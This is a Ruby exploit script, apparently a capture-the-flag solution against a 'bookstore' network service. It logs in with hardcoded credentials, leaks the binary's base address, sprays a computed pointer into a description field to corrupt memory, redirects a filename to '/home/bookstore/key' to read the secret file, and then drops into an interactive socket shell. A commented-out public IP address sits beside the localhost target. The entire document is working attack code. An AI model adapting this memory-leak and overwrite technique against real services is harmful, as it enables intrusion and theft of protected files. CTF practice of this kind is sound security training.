require 'socket'

class Exploit
  def shell
    Thread.new { loop { print @s.read(1) }}
    loop do 
      @s.write(readline())
    end
  end
  def initialize
#    @s = TCPSocket.new('54.65.201.110', 31337)
    @s = TCPSocket.new('localhost', 31337)
    17.times { puts @s.readline }
    puts @s.read("== Input Your ID : ".length)
    @s.write("helloadmin\n")
    puts @s.read("== Input Your PASSWORD : ".length)
    @s.write("iulover!@\#$\n")
    puts @s.readline
    puts @s.readline

    add_book('a'*0x13,'b'*299,0)

    #enter menu
    memory_leak()

    enter_modify(0)
    modify()
    @s.write("2\n")
    modify_desc([@bin_base + 0x8db].pack('I') * 750)
#    modify_desc("a"* 3000)
    readline
    modify()
    modify_info()

    modify()
    modify_ship()

    modify()
    @s.write("0\n")
    puts @s.read(4)

    read_menu()
    show_info(0)
    readline

    shell()
  end

  def memory_leak()
    enter_modify(0)
    modify()

    @s.write("3\n")
    puts @s.readline
    @s.write("#{0xffffffff}\n")
    puts @s.readline
    @s.write("#{0xffffffff}\n")
    puts @s.readline
    @s.write("1\n")
    puts @s.readline
    @s.write("1\n")

    # filename
    puts @s.readline
    @s.write("c"*0x20)
    puts @s.readline

    # desc
    puts @s.readline
    @s.write("c"*0x20)
    puts @s.readline

    modify()
    @s.write("0\n")
    puts @s.read("Exit".length)

    read_menu()
    @s.write("4\n")
    puts @s.readline
    @bin_base = @s.readline[74..77].unpack('<I')[0] - 0x9ad
    puts "#{@bin_base.to_s(16)}"
    puts @s.readline
    puts @s.readline
     readline
  end

  def enter_modify(index)
    read_menu()
    @s.write("2\n")
    puts @s.read("Input No : ".length)
    @s.write("#{index}\n")
  end

  def show_info(index)
    @s.write("3\n")
    puts @s.read("Input No : ".length)
    readline
    @s.write("#{index}\n")
  end

  def modify_ship
    @s.write("4\n")
    puts @s.readline
    @s.write("1\n")
    puts @s.readline
  end

  def modify()
    6.times { puts @s.readline }
  end

  def modify_info()
    @s.write("3\n")
    puts @s.readline
    @s.write("1234\n")
    puts @s.readline
    @s.write("1234\n")
    puts @s.readline
    @s.write("0\n") # free ship
    puts @s.readline
    @s.write("0\n")
    modify_bookname("/home/bookstore/key\x00")
    modify_desc("A"*2000)
  end

  def modify_desc(name)
    puts @s.readline
    @s.write("#{name}\n")
    puts @s.readline
  end

  def modify_bookname(name)
    puts @s.readline
    @s.write("#{name}\n")
    puts @s.readline
  end

  def read_menu
    7.times { puts @s.readline }
    puts @s.read("> ".length)
  end

  def add_book(name, desc, type, max_download = 0)
    read_menu()
    @s.write("1\n")
    puts @s.readline
    @s.write(name + "\n")
    puts @s.readline
    @s.write(desc + "\n")
    puts @s.readline
    @s.write("#{type}\n")
    puts @s.readline
    puts @s.readline

    if type == 1
      puts @s.readline
      @s.write("#{max_download}\n")
    end

    puts @s.readline
  end
end

s = Exploit.new
